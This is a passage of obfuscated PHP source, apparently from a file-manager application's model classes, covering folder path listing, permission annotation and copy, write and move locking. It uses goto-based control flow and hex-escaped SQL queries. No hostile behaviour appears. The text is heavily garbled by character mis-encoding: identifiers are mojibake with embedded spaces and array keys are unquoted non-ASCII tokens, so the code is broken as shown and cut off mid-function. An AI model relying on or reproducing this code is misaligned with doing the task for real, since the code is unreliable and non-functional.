$dÂ‚ôĞÒÍÍ = array(); goto b«œ¢Ó‘ÔŠ; A¢ùÍ‰å©è: foreach ($B‡µ¥àÎ½ë as &$Fí¤éÂóƒ¦) { if ($Fí¤éÂóƒ¦[$FÛ»Úèö•†[395]]) { unset($Fí¤éÂóƒ¦[$FÛ»Úèö•†[397]]); $Fí¤éÂóƒ¦[$FÛ»Úèö•†[210]] = intval($dÂ‚ôĞÒÍÍ[$Fí¤éÂóƒ¦[$FÛ»Úèö•†[394]] . $FÛ»Úèö•†[477]][$FÛ»Úèö•†[478]]); $Fí¤éÂóƒ¦[$FÛ»Úèö•†[209]] = intval($dÂ‚ôĞÒÍÍ[$Fí¤éÂóƒ¦[$FÛ»Úèö•†[394]] . $FÛ»Úèö•†[479]][$FÛ»Úèö•†[478]]); } } unset($Fí¤éÂóƒ¦); goto EÏ¯‘ÁŠªÓ; D«êˆØÑîö: $B®¤ŒàÃÆ… = $this->tablePrefix . $this->tableName; for ($e¡Œ‡ØŞ“ = 0; $e¡Œ‡ØŞ“ < $e¥ŸîÙ ×¶; $e¡Œ‡ØŞ“++) { $bã–´šÚ„¥ = intval($B‡µ¥àÎ½ë[$e¡Œ‡ØŞ“][$FÛ»Úèö•†[422]]); if ($B‡µ¥àÎ½ë[$e¡Œ‡ØŞ“][$FÛ»Úèö•†[395]]) { $fëô‡ˆˆ§¯ = $B‡µ¥àÎ½ë[$e¡Œ‡ØŞ“][$FÛ»Úèö•†[394]]; $cø‡ÈˆÂà¬ .= "\x53\105\x4c\x45\103\x54\x20\52\40\x46\122\117\115\x20\50\x53\x45\x4c\105\x43\x54\x20\x27{$fëô‡ˆˆ§¯}\137\x68\141\x73\x46\x69\x6c\145\x27\40\x61\x73\x20\150\x61\163\54\143\157\x75\x6e\x74\50\61\51\x20\141\163\x20\x68\x61\x73\x43\157\x75\x6e\x74\x20\x46\x52\x4f\x4d\40\x60{$B®¤ŒàÃÆ…}\x60\40\xa\x9\11\x9\x9\x9\167\x68\145\162\145\40\x70\x61\162\x65\x6e\164\x49\x44\x3d{$fëô‡ˆˆ§¯}\40\x61\156\x64\x20\151\x73\106\157\x6c\144\x65\x72\75\x30\40\x61\x6e\144\40\x69\163\x44\145\x6c\x65\164\x65\x3d{$bã–´šÚ„¥}\x29\40\x61\163\40\x74\x62\61\x5f{$fëô‡ˆˆ§¯}\40\165\156\x69\157\x6e\40\141\x6c\154\x20\xa\x9\11\x9\11\x9\x53\105\114\x45\103\x54\x20\x2a\40\x46\122\117\115\40\50\123\105\x4c\x45\x43\x54\40\47{$fëô‡ˆˆ§¯}\137\150\x61\x73\106\x6f\154\x64\x65\162\x27\40\x61\163\x20\150\141\x73\106\151\154\145\x2c\x63\157\x75\x6e\164\x28\x31\51\x20\141\x73\40\150\141\x73\103\x6f\x75\156\164\x20\106\122\x4f\115\40\x60{$B®¤ŒàÃÆ…}\x60\x20\12\11\11\11\x9\x9\167\x68\x65\x72\145\x20\x70\x61\x72\x65\156\x74\x49\104\75{$fëô‡ˆˆ§¯}\x20\141\156\144\40\x69\x73\x46\x6f\154\144\x65\162\75\61\x20\141\156\x64\x20\151\x73\x44\145\x6c\x65\x74\x65\75{$bã–´šÚ„¥}\51\40\x61\x73\x20\x74\x62\x32\137{$fëô‡ˆˆ§¯}\40\x75\156\x69\157\156\x20\141\x6c\154\40"; } if ((strlen($cø‡ÈˆÂà¬) >= $dåê¸µÓæĞ || $e¡Œ‡ØŞ“ == $e¥ŸîÙ ×¶ - 1) && $cø‡ÈˆÂà¬) { $cø‡ÈˆÂà¬ = substr($cø‡ÈˆÂà¬, 0, -strlen($FÛ»Úèö•†[475])); $A™Ôí‘å = $this->query($cø‡ÈˆÂà¬); $dÂ‚ôĞÒÍÍ = array_merge($dÂ‚ôĞÒÍÍ, $A™Ôí‘å); $cø‡ÈˆÂà¬ = $FÛ»Úèö•†[33]; } } $dÂ‚ôĞÒÍÍ = array_to_keyvalue($dÂ‚ôĞÒÍÍ, $FÛ»Úèö•†[476]); goto A¢ùÍ‰å©è; EÏ¯‘ÁŠªÓ: } protected function _listAppendAuth(&$F†Æ“©¤) { goto F¯Šßˆëº; F¯Šßˆëº: $c‚ë¬³–¥à =& $_SERVER[¢Í]; if (!defined($c‚ë¬³–¥à[451])) { return; } $cÛÔ·¶‰ê‡ = array(); goto Aƒ×Ü‡¿ÈÂ; F–Èˆ«ø¡: $fÛ‰‘ÆàÜä = Model($c‚ë¬³–¥à[480])->getSourceList($cÛÔ·¶‰ê‡, $bÅò“ õİ); foreach ($F†Æ“©¤ as $fĞ„å¥Õ…Ğ => &$cæ‡ëÚ‚›) { $cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]] = $fÛ‰‘ÆàÜä[$cæ‡ëÚ‚›[$c‚ë¬³–¥à[394]]]; if (!$cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]] && $cæ‡ëÚ‚›[$c‚ë¬³–¥à[396]] == self::TYPE_GROUP) { $cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]] = Action($c‚ë¬³–¥à[481])->pathGroupAuthMake($cæ‡ëÚ‚›[$c‚ë¬³–¥à[482]]); if (!$cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]] && !_get($GLOBALS, $c‚ë¬³–¥à[483])) { $cæ‡ëÚ‚›[$c‚ë¬³–¥à[202]] = !1; $cæ‡ëÚ‚›[$c‚ë¬³–¥à[201]] = !1; } } if ($cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]]) { $cæ‡ëÚ‚›[$c‚ë¬³–¥à[202]] = AuthModel::authCheckEdit($cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]][$c‚ë¬³–¥à[402]]); $cæ‡ëÚ‚›[$c‚ë¬³–¥à[201]] = AuthModel::authCheckView($cæ‡ëÚ‚›[$c‚ë¬³–¥à[401]][$c‚ë¬³–¥à[402]]); } $this->groupPathDisplay($cæ‡ëÚ‚›); } unset($cæ‡ëÚ‚›); goto d»”Ó§„”†; Aƒ×Ü‡¿ÈÂ: foreach ($F†Æ“©¤ as $cæ‡ëÚ‚›) { if ($cæ‡ëÚ‚›[$c‚ë¬³–¥à[396]] == self::TYPE_GROUP) { $cÛÔ·¶‰ê‡[] = $cæ‡ëÚ‚›[$c‚ë¬³–¥à[394]]; } } if (!$cÛÔ·¶‰ê‡) { return; } $bÅò“ õİ = array_to_keyvalue($F†Æ“©¤, $c‚ë¬³–¥à[394]); goto F–Èˆ«ø¡; d»”Ó§„”†: } public function groupPathDisplay(&$bš×óˆÛÑª) { goto DæÃ–Î´â‘; eçí‘©©Ø·: $bš×óˆÛÑª[$f™­ÔÙÃ‘™[486]] = $b ›°˜£Ó[$f™­ÔÙÃ‘™[487]]; $bš×óˆÛÑª[$f™­ÔÙÃ‘™[405]] = $b ›°˜£Ó[$f™­ÔÙÃ‘™[485]]; $bš×óˆÛÑª[$f™­ÔÙÃ‘™[488]] = $b ›°˜£Ó[$f™­ÔÙÃ‘™[489]]; goto BÂñøî²¶Û; BÂñøî²¶Û: $bš×óˆÛÑª[$f™­ÔÙÃ‘™[490]] = $C†ñ—ƒÜØŠ . $b ›°˜£Ó[$f™­ÔÙÃ‘™[416]][$f™­ÔÙÃ‘™[394]]; goto AœºŞÅâƒ×; eºÇ‚îœƒ: $Fö†Òø¥“µ = $this->parentLevelArray($b ›°˜£Ó[$f™­ÔÙÃ‘™[485]]); $C†ñ—ƒÜØŠ = $f™­ÔÙÃ‘™[33]; foreach ($Fö†Òø¥“µ as $B‚»›÷”È¼) { $CâĞèÙ‚·× = Model($f™­ÔÙÃ‘™[484])->getInfo($B‚»›÷”È¼); $C†ñ—ƒÜØŠ .= $CâĞèÙ‚·×[$f™­ÔÙÃ‘™[416]][$f™­ÔÙÃ‘™[394]] . $f™­ÔÙÃ‘™[47]; } goto eçí‘©©Ø·; DæÃ–Î´â‘: $f™­ÔÙÃ‘™ =& $_SERVER[¢Í]; if ($bš×óˆÛÑª[$f™­ÔÙÃ‘™[396]] != self::TYPE_GROUP) { return; } $b ›°˜£Ó = Model($f™­ÔÙÃ‘™[484])->getInfo($bš×óˆÛÑª[$f™­ÔÙÃ‘™[482]]); goto eºÇ‚îœƒ; AœºŞÅâƒ×: } protected function _listAppendPath(&$C¸·Æä×·) { goto a‰ÈŒ»æØ; a‰ÈŒ»æØ: $AøëÉ¸÷íé =& $_SERVER[¢Í]; static $dø•İÇšè» = array(); $bšì·”Å¹ = array(); goto B”¢»¦ËÜé; eÚ©ˆ‡ğæ: return $C¸·Æä×·; goto F±Ÿ·æÙ·¼; f–Á°­¸ğ…: $C‘¥İÓÈ¹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($C¸·Æä×· as &$e‚Áµó‡á‡) { goto E•í¿•×¶; E•í¿•×¶: $B„Şé‚øÁ = $this->parentLevelArray($e‚Áµó‡á‡[$AøëÉ¸÷íé[485]]); $dé¶”Ğ´ê½ = $this->_listAppendPathRoot($e‚Áµó‡á‡, $B„Şé‚øÁ); foreach ($B„Şé‚øÁ as $FÍ…’Ú·Ìğ => $cº‰¬Ôãœ‡) { if ($FÍ…’Ú·Ìğ == 0 && $dé¶”Ğ´ê½ && $e‚Áµó‡á‡[$AøëÉ¸÷íé[396]] == self::TYPE_GROUP) { continue; } if (isset($dø•İÇšè»[$cº‰¬Ôãœ‡])) { $dé¶”Ğ´ê½ .= $dø•İÇšè»[$cº‰¬Ôãœ‡] . $AøëÉ¸÷íé[8]; } } goto a¯å…ù†¥Ü; b§³¼è×¡§: $aºÄùø¡‚® = trim($e‚Áµó‡á‡[$AøëÉ¸÷íé[492]], $AøëÉ¸÷íé[8]); if ($e‚Áµó‡á‡[$AøëÉ¸÷íé[487]] == $AøëÉ¸÷íé[494] && $aºÄùø¡‚®) { $e‚Áµó‡á‡[$AøëÉ¸÷íé[28]] = $aºÄùø¡‚®; } $this->_listAppendPathRecycle($e‚Áµó‡á‡, $B„Şé‚øÁ, $C‘¥İÓÈ¹); goto C›ì§É…Â´; a¯å…ù†¥Ü: if ($B„Şé‚øÁ) { $dé¶”Ğ´ê½ .= $e‚Áµó‡á‡[$AøëÉ¸÷íé[28]]; } if ($e‚Áµó‡á‡[$AøëÉ¸÷íé[395]]) { $dé¶”Ğ´ê½ .= $AøëÉ¸÷íé[8]; } $e‚Áµó‡á‡[$AøëÉ¸÷íé[492]] = str_replace($AøëÉ¸÷íé[493], $AøëÉ¸÷íé[8], $dé¶”Ğ´ê½); goto b§³¼è×¡§; C›ì§É…Â´: } unset($e‚Áµó‡á‡); goto eÚ©ˆ‡ğæ; B”¢»¦ËÜé: foreach ($C¸·Æä×· as &$e‚Áµó‡á‡) { $dø•İÇšè»[$e‚Áµó‡á‡[$AøëÉ¸÷íé[394]]] = $e‚Áµó‡á‡[$AøëÉ¸÷íé[28]]; $B„Şé‚øÁ = $this->parentLevelArray($e‚Áµó‡á‡[$AøëÉ¸÷íé[485]]); foreach ($B„Şé‚øÁ as $FÍ…’Ú·Ìğ => $cº‰¬Ôãœ‡) { if ($FÍ…’Ú·Ìğ != 0 && !isset($dø•İÇšè»[$cº‰¬Ôãœ‡])) { $bšì·”Å¹[] = $cº‰¬Ôãœ‡; } } } unset($e‚Áµó‡á‡); if (count($bšì·”Å¹) > 0) { $CÍ¼Õ¬ßà = array($AøëÉ¸÷íé[408] => array($AøëÉ¸÷íé[409], $bšì·”Å¹)); if (count($bšì·”Å¹) == 1) { $f»Ù˜Ã—Ò = $this->sourceInfo($bšì·”Å¹[0]); $aª“Ñ °Ñ = is_array($f»Ù˜Ã—Ò) ? array($f»Ù˜Ã—Ò) : !1; } else { $aª“Ñ °Ñ = $this->field($AøëÉ¸÷íé[491])->where($CÍ¼Õ¬ßà)->select(); } $Aß×·™Úã = array_to_keyvalue($aª“Ñ °Ñ, $AøëÉ¸÷íé[394], $AøëÉ¸÷íé[28]); $dø•İÇšè» = array_merge_index($dø•İÇšè», $Aß×·™Úã); } goto f–Á°­¸ğ…; F±Ÿ·æÙ·¼: } private function _listAppendPathRecycle(&$Dšœƒª™À, $fÄ¡°‡Šœ, $b“ë‰Á±Š”) { goto B¢œ„ŠÊİ; E«¢•é»ç¯: $Dšœƒª™À[$dĞ¡á†Ø»È[485]] = $dĞ¡á†Ø»È[496] . implode($dĞ¡á†Ø»È[47], array_slice($fÄ¡°‡Šœ, 1)) . $dĞ¡á†Ø»È[47]; if ($Dšœƒª™À[$dĞ¡á†Ø»È[394]] == $b“ë‰Á±Š”) { $Dšœƒª™À[$dĞ¡á†Ø»È[485]] = $dĞ¡á†Ø»È[496]; $Dšœƒª™À[$dĞ¡á†Ø»È[487]] = $dĞ¡á†Ø»È[494]; $Dšœƒª™À[$dĞ¡á†Ø»È[28]] = LNG($dĞ¡á†Ø»È[495]); } $Dšœƒª™À[$dĞ¡á†Ø»È[497]] = $dĞ¡á†Ø»È[498]; goto BõŒ‰ªõÎß; B¢œ„ŠÊİ: $dĞ¡á†Ø»È =& $_SERVER[¢Í]; if (intval($Dšœƒª™À[$dĞ¡á†Ø»È[396]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($b“ë‰Á±Š”, $fÄ¡°‡Šœ) && $Dšœƒª™À[$dĞ¡á†Ø»È[394]] != $b“ë‰Á±Š”) { return; } goto aº…²‰ù™Á; aº…²‰ù™Á: $DÃŸ‚…É® = explode($dĞ¡á†Ø»È[8], trim($Dšœƒª™À[$dĞ¡á†Ø»È[492]], $dĞ¡á†Ø»È[8])); $a´‡¸¸ÚÍİ = implode($dĞ¡á†Ø»È[8], array_slice($DÃŸ‚…É®, 2)); $Dšœƒª™À[$dĞ¡á†Ø»È[492]] = $dĞ¡á†Ø»È[8] . LNG($dĞ¡á†Ø»È[495]) . $dĞ¡á†Ø»È[8] . ltrim($a´‡¸¸ÚÍİ, $dĞ¡á†Ø»È[8]); goto E«¢•é»ç¯; BõŒ‰ªõÎß: } protected function _listAppendPathRoot(&$C§ÑØĞöÉ‚, $DİÏ˜°ñÉ®) { $d™¢‡¾´å‰ =& $_SERVER[¢Í]; $D…”Ëä× Ô = $d™¢‡¾´å‰[33]; if ($C§ÑØĞöÉ‚[$d™¢‡¾´å‰[396]] == self::TYPE_USER) { if (defined($d™¢‡¾´å‰[451]) && $C§ÑØĞöÉ‚[$d™¢‡¾´å‰[482]] == USER_ID) { $D…”Ëä× Ô = LNG($d™¢‡¾´å‰[499]); if (!$DİÏ˜°ñÉ®) { $C§ÑØĞöÉ‚[$d™¢‡¾´å‰[28]] = $D…”Ëä× Ô; } } else { $B¿›Ñ—˜İ½ = Model($d™¢‡¾´å‰[500])->getInfoSimple($C§ÑØĞöÉ‚[$d™¢‡¾´å‰[482]]); $D…”Ëä× Ô = LNG($d™¢‡¾´å‰[501]) . $d™¢‡¾´å‰[167] . $B¿›Ñ—˜İ½[$d™¢‡¾´å‰[28]] . $d™¢‡¾´å‰[502]; } } else { if ($C§ÑØĞöÉ‚[$d™¢‡¾´å‰[396]] == self::TYPE_GROUP) { $B¿›Ñ—˜İ½ = Model($d™¢‡¾´å‰[484])->getInfoSimple($C§ÑØĞöÉ‚[$d™¢‡¾´å‰[482]]); $D…”Ëä× Ô = $B¿›Ñ—˜İ½[$d™¢‡¾´å‰[28]]; } else { if ($C§ÑØĞöÉ‚[$d™¢‡¾´å‰[396]] == self::TYPE_SYSTEM) { $B¿›Ñ—˜İ½ = $this->sourceInfo($DİÏ˜°ñÉ®[0], !0); $D…”Ëä× Ô = $B¿›Ñ—˜İ½[$d™¢‡¾´å‰[28]]; } } } $D…”Ëä× Ô = $D…”Ëä× Ô ? $d™¢‡¾´å‰[8] . $D…”Ëä× Ô . $d™¢‡¾´å‰[8] : $d™¢‡¾´å‰[8]; return $D…”Ëä× Ô; } protected function _listAppendUser(&$C‹­Îàğ£­) { goto aÈ‚øÜŒË; e¬ß¥‡¿·Š: unset($AŠ¾âºß); goto Fİë©Šš§ã; aÈ‚øÜŒË: $BÖĞªˆ„ÕÛ =& $_SERVER[¢Í]; $F­½„©Ìñ = array_to_keyvalue($C‹­Îàğ£­, $BÖĞªˆ„ÕÛ[33], $BÖĞªˆ„ÕÛ[403]); $e„³ßÇââ´ = array_to_keyvalue($C‹­Îàğ£­, $BÖĞªˆ„ÕÛ[33], $BÖĞªˆ„ÕÛ[404]); goto D¡ò‰÷¦¸é; D¡ò‰÷¦¸é: $bå¶ß‘öÛ = array_merge($F­½„©Ìñ, $e„³ßÇââ´); $CÆ‡„Ô²»© = Model($BÖĞªˆ„ÕÛ[503])->userListInfo($bå¶ß‘öÛ); foreach ($C‹­Îàğ£­ as &$AŠ¾âºß) { $FÂ–Ÿ¶Êª¨ = $AŠ¾âºß[$BÖĞªˆ„ÕÛ[403]]; $AŠ¾âºß[$BÖĞªˆ„ÕÛ[403]] = $CÆ‡„Ô²»©[$FÂ–Ÿ¶Êª¨] ? $CÆ‡„Ô²»©[$FÂ–Ÿ¶Êª¨] : !1; $FÂ–Ÿ¶Êª¨ = $AŠ¾âºß[$BÖĞªˆ„ÕÛ[404]]; $AŠ¾âºß[$BÖĞªˆ„ÕÛ[404]] = $CÆ‡„Ô²»©[$FÂ–Ÿ¶Êª¨] ? $CÆ‡„Ô²»©[$FÂ–Ÿ¶Êª¨] : !1; if (isset($AŠ¾âºß[$BÖĞªˆ„ÕÛ[442]]) && $AŠ¾âºß[$BÖĞªˆ„ÕÛ[442]][$BÖĞªˆ„ÕÛ[504]]) { $F®ÏÜàà¿ = $GLOBALS[$BÖĞªˆ„ÕÛ[6]][$BÖĞªˆ„ÕÛ[94]][$BÖĞªˆ„ÕÛ[505]]; if ($AŠ¾âºß[$BÖĞªˆ„ÕÛ[442]][$BÖĞªˆ„ÕÛ[506]] <= time() - $F®ÏÜàà¿) { $this->metaSet($AŠ¾âºß[$BÖĞªˆ„ÕÛ[394]], $BÖĞªˆ„ÕÛ[504], null); $this->metaSet($AŠ¾âºß[$BÖĞªˆ„ÕÛ[394]], $BÖĞªˆ„ÕÛ[506], null); unset($AŠ¾âºß[$BÖĞªˆ„ÕÛ[442]][$BÖĞªˆ„ÕÛ[504]]); continue; } $B„‹†Œ‰ÓŒ = $AŠ¾âºß[$BÖĞªˆ„ÕÛ[442]][$BÖĞªˆ„ÕÛ[504]]; $AŠ¾âºß[$BÖĞªˆ„ÕÛ[442]][$BÖĞªˆ„ÕÛ[507]] = Model($BÖĞªˆ„ÕÛ[503])->getInfoSimpleOuter($B„‹†Œ‰ÓŒ); } } goto e¬ß¥‡¿·Š; Fİë©Šš§ã: } public function parentLevelArray($Eò¿ö—åìÔ) { $bÇƒõ–Š =& $_SERVER[¢Í]; $Eò¿ö—åìÔ = explode($bÇƒõ–Š[47], trim($Eò¿ö—åìÔ, $bÇƒõ–Š[47])); return array_remove_value($Eò¿ö—åìÔ, $bÇƒõ–Š[494]); } public function listAll($dáå†ÀÂ™) { goto dŠ›«¿İªÙ; FÀ¢âòßğ: $aœ†—Ã¦ÏÙ = array(); foreach ($bŞ¬ÃÅÔÚ­ as $E“îâ›§ßæ => $A×ºÄ›À«) { goto c«åŒÅº; B¦äÌ³‘ë×: $eÙÚœÉ„ = str_replace($eäÍ’ÛÎŒæ[493], $eäÍ’ÛÎŒæ[8], $eÙÚœÉ„); $eÙÚœÉ„ = str_replace($eäÍ’ÛÎŒæ[493], $eäÍ’ÛÎŒæ[8], $eÙÚœÉ„); $A¦Ş×Æ—‚Ñ = array($eäÍ’ÛÎŒæ[412] => str_replace($eäÍ’ÛÎŒæ[493], $eäÍ’ÛÎŒæ[8], $eÙÚœÉ„), $eäÍ’ÛÎŒæ[514] => intval($A×ºÄ›À«[$eäÍ’ÛÎŒæ[395]]), $eäÍ’ÛÎŒæ[416] => $this->pathInfoFilter($A×ºÄ›À«, !0)); goto E¥§ƒâÍ±; bÂøˆøÕ–: for ($eîí¢ù«¼á = 0; $eîí¢ù«¼á < count($F¶“·×Ø); $eîí¢ù«¼á++) { $eÙÚœÉ„ .= $bŞ¬ÃÅÔÚ­[$F¶“·×Ø[$eîí¢ù«¼á]][$eäÍ’ÛÎŒæ[28]] . $eäÍ’ÛÎŒæ[8]; } $eÙÚœÉ„ .= $A×ºÄ›À«[$eäÍ’ÛÎŒæ[28]]; if ($A×ºÄ›À«[$eäÍ’ÛÎŒæ[395]]) { $eÙÚœÉ„ .= $eäÍ’ÛÎŒæ[8]; } goto B¦äÌ³‘ë×; c«åŒÅº: $F¶“·×Ø = $this->parentLevelArray($A×ºÄ›À«[$eäÍ’ÛÎŒæ[485]]); array_shift($F¶“·×Ø); $eÙÚœÉ„ = $AºôÆñÀ®ñ; goto bÂøˆøÕ–; E¥§ƒâÍ±: if (!$A×ºÄ›À«[$eäÍ’ÛÎŒæ[395]]) { $A¦Ş×Æ—‚Ñ[$eäÍ’ÛÎŒæ[444]] = $A×ºÄ›À«[$eäÍ’ÛÎŒæ[444]]; $A¦Ş×Æ—‚Ñ[$eäÍ’ÛÎŒæ[515]] = $A×ºÄ›À«[$eäÍ’ÛÎŒæ[85]]; } $aœ†—Ã¦ÏÙ[] = $A¦Ş×Æ—‚Ñ; goto CòŠ…‘ŠÜ; CòŠ…‘ŠÜ: } return $aœ†—Ã¦ÏÙ; goto F…¬±„ÙÁ; D››™ÌÜ•®: $this->_listAppendAuth($bŞ¬ÃÅÔÚ­); $this->_listAppendUser($bŞ¬ÃÅÔÚ­); $this->_listAppendPath($bŞ¬ÃÅÔÚ­); goto e¸ÎÄø«Şí; e¸ÎÄø«Şí: $bŞ¬ÃÅÔÚ­ = array_to_keyvalue($bŞ¬ÃÅÔÚ­, $eäÍ’ÛÎŒæ[394]); $AºôÆñÀ®ñ = "\57{$døèô‹Ë‚[$eäÍ’ÛÎŒæ[28]]}\57"; $AºôÆñÀ®ñ = $AºôÆñÀ®ñ == $eäÍ’ÛÎŒæ[493] ? $eäÍ’ÛÎŒæ[8] : $AºôÆñÀ®ñ; goto FÀ¢âòßğ; B°‚Œöàí: $EøËÖ¤„™ = $eäÍ’ÛÎŒæ[512]; $A¥ÒšÚç› = "\114\x45\x46\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\x5f\146\151\x6c\x65\x20\146\x69\x6c\145\40\157\x6e\40\163\x6f\x75\x72\143\145\x2e\146\x69\x6c\x65\x49\104\x20\x3d\x20\x66\x69\154\145\x2e\x66\x69\x6c\x65\x49\104"; $bŞ¬ÃÅÔÚ­ = $this->alias($eäÍ’ÛÎŒæ[513])->field($EøËÖ¤„™)->where($bµ“¡…íšÎ)->join($A¥ÒšÚç›)->select(); goto D››™ÌÜ•®; dŠ›«¿İªÙ: $eäÍ’ÛÎŒæ =& $_SERVER[¢Í]; $døèô‹Ë‚ = $this->sourceInfo($dáå†ÀÂ™); $bµ“¡…íšÎ = array($eäÍ’ÛÎŒæ[508] => array($eäÍ’ÛÎŒæ[509], $døèô‹Ë‚[$eäÍ’ÛÎŒæ[485]] . $dáå†ÀÂ™ . $eäÍ’ÛÎŒæ[510]), $eäÍ’ÛÎŒæ[511] => 0); goto B°‚Œöàí; F…¬±„ÙÁ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($BÙñ‚å‘ñ) { goto C†â¶øˆï¼; C†â¶øˆï¼: $B–ƒ¥ï»Ç¤ =& $_SERVER[¢Í]; if (!$this->allowLock()) { return; } $this->_lockCheck($B–ƒ¥ï»Ç¤[516], $BÙñ‚å‘ñ); goto BšÃÓ‚ñ–Š; BšÃÓ‚ñ–Š: $C„¬‹®¹Ô = 1; $this->_lockEvent($BÙñ‚å‘ñ, array($B–ƒ¥ï»Ç¤[517], $B–ƒ¥ï»Ç¤[518]), $C„¬‹®¹Ô); $this->_lockParent($BÙñ‚å‘ñ, array($B–ƒ¥ï»Ç¤[518]), $C„¬‹®¹Ô); goto bôô¨Á‘æò; bôô¨Á‘æò: $this->_lockEvent($BÙñ‚å‘ñ, array($B–ƒ¥ï»Ç¤[519], $B–ƒ¥ï»Ç¤[520]), $C„¬‹®¹Ô); $this->_lockCheckEnd($B–ƒ¥ï»Ç¤[516], $BÙñ‚å‘ñ); goto a´Æ‹¡§Š ; a´Æ‹¡§Š : } public function lockCopyEnd($e™ğ¢Æ¦­Ä) { $Aä¨‹¸¦°Ú =& $_SERVER[¢Í]; if (!$this->allowLock()) { return; } $a‘áÆ½Â£Â = 0; $this->_lockEvent($e™ğ¢Æ¦­Ä, array($Aä¨‹¸¦°Ú[517], $Aä¨‹¸¦°Ú[518]), $a‘áÆ½Â£Â); $this->_lockParent($e™ğ¢Æ¦­Ä, array($Aä¨‹¸¦°Ú[518]), $a‘áÆ½Â£Â); $this->_lockEvent($e™ğ¢Æ¦­Ä, array($Aä¨‹¸¦°Ú[519], $Aä¨‹¸¦°Ú[520]), $a‘áÆ½Â£Â); } public function lockWriteStart($a÷¡èŞ‰‹·, $cš›¬Å³¥È = '') { goto B¿ğ¹ØÀ¹Õ; B¿ğ¹ØÀ¹Õ: $e‡•ëÄ¡Ã =& $_SERVER[¢Í]; if (!$this->allowLock()) { return; } $this->_lockCheck($e‡•ëÄ¡Ã[517], $a÷¡èŞ‰‹·); goto fƒ½êñšçØ; E—˜óÅšˆ: $this->_lockParent($a÷¡èŞ‰‹·, array($e‡•ëÄ¡Ã[516], $e‡•ëÄ¡Ã[518]), $bò×‘Ğ ½½); $this->_lockCheckEnd($e‡•ëÄ¡Ã[517], $a÷¡èŞ‰‹·); goto Eêø ÆèÒ; fƒ½êñšçØ: $bò×‘Ğ ½½ = 1; $this->_lockKey($e‡•ëÄ¡Ã[521] . $a÷¡èŞ‰‹· . $e‡•ëÄ¡Ã[101] . $cš›¬Å³¥È, $bò×‘Ğ ½½); $this->_lockEvent($a÷¡èŞ‰‹·, array($e‡•ëÄ¡Ã[516], $e‡•ëÄ¡Ã[518]), $bò×‘Ğ ½½); goto E—˜óÅšˆ; Eêø ÆèÒ: } public function lockWriteEnd($F‰ÖŞ‰Ìª, $bº‰ãùé‡‡ = '') { $DĞ¨î©µß =& $_SERVER[¢Í]; if (!$this->allowLock()) { return; } $dŞáÚæø¥Í = 0; $this->_lockKey($DĞ¨î©µß[521] . $F‰ÖŞ‰Ìª . $DĞ¨î©µß[101] . $bº‰ãùé‡‡, $dŞáÚæø¥Í); $this->_lockEvent($F‰ÖŞ‰Ìª, array($DĞ¨î©µß[516], $DĞ¨î©µß[518]), $dŞáÚæø¥Í); $this->_lockParent($F‰ÖŞ‰Ìª, array($DĞ¨î©µß[516], $DĞ¨î©µß[518]), $dŞáÚæø¥Í); } public function lockMoveStart($a‰×…®â) { goto dòğ¯ £ ½; BßŒ·ù‹Á: $B¦Áã»ÁŠ = 1; $this->_lockKey($aÄ£‚–ÎŒ[522] . $a‰×…®â, $B¦Áã»ÁŠ); $this->_lockEvent($a‰×…®â, array($aÄ£‚–ÎŒ[516], $aÄ£‚–ÎŒ[517]), $B¦Áã»ÁŠ); goto FùĞÈ¨¡‡ò; FùĞÈ¨¡‡ò: $this->_lockParent($a‰×…®â, array($aÄ£‚–ÎŒ[516], $aÄ£‚–ÎŒ[518]), $B¦Áã»ÁŠ); $this->_lockEvent($a‰×…®â, array($aÄ£‚–ÎŒ[523], $aÄ£‚–ÎŒ[519], $aÄ£‚–ÎŒ[520]), $B¦Áã»ÁŠ); $this->_lockCheckEnd($aÄ£‚–ÎŒ[518], $a‰×…®â); goto DÅšÈ¨æ¾Å; dòğ¯ £ ½: $aÄ£‚–ÎŒ =& $_SERVER[¢Í]; if (!$this->allowLock()) { return; } $this->_lockCheck($aÄ£‚–ÎŒ[518], $a‰×…®â); goto BßŒ·ù‹Á; DÅšÈ¨æ¾Å: } public function lockMoveEnd($cİ‚ëŠ´¾…) { goto E›óÚŠ“½; E´Î§åíË: $this->_lockEvent($cİ‚ëŠ´¾…, array($C¢®ëØ¾«ë[523], $C¢®ëØ¾«ë[519], $C¢®ëØ¾«ë[520]), $b•â‹Â¼øó); goto F£¸Ã¯Ï§°; Cööõ„°«õ: $this->_lockKey($C¢®ëØ¾«ë[522] . $cİ‚ëŠ´¾…, $b•â‹Â¼øó); $this->_lockEvent($cİ‚ëŠ´¾…, array($C¢®ëØ¾«ë[516], $C¢®ëØ¾«ë[517]), $b•â‹Â¼øó); $this->_lockParent($cİ‚ëŠ´¾…, array($C¢®ëØ¾«ë[516], $C¢®ëØ¾«ë[518]), $b•â‹Â¼øó); goto E´Î§åíË; E›óÚŠ“½: $C¢®ëØ¾«ë =& $_SERVER[¢Í]; if (!$this->allowLock()) { return; } $b•â‹Â¼øó = 0; goto Cööõ„°«õ; F£¸Ã¯Ï§°: } private function _lockCheck($eå‹ŠÀÛŠÍ, $CöˆÏ»Á˜Å) { goto cİçìœÀò³; bìà•‹‰Ø¥: $EÀŒÇÉ¨´  = array_reverse($this->parentLevelArray($EÉáºä‚‹[$féË¡À¶İ¼[485]])); foreach ($EÀŒÇÉ¨´  as $B¿ƒòÔÓ ) { $AÅÒ‘àó¬æ = $eå‹ŠÀÛŠÍ . $féË¡À¶İ¼[525] . $B¿ƒòÔÓ ; if (CacheLock::lockGet($féË¡À¶İ¼[526] . $AÅÒ‘àó¬æ)) { $EÉáºä‚‹ = $this->sourceInfo($B¿ƒòÔÓ ); CacheLock::setErrorMsg($féË¡À¶İ¼[167] . htmlspecialchars($EÉáºä‚‹[$féË¡À¶İ¼[28]]) . $féË¡À¶İ¼[502] . $aÈ­„µñ”); $this->_lockKey($AÅÒ‘àó¬æ, 1); $this->_lockKey($AÅÒ‘àó¬æ, 0); } } goto B¦•×Ã¸—; cİçìœÀò³: $féË¡À¶İ¼ =& $_SERVER[¢Í]; 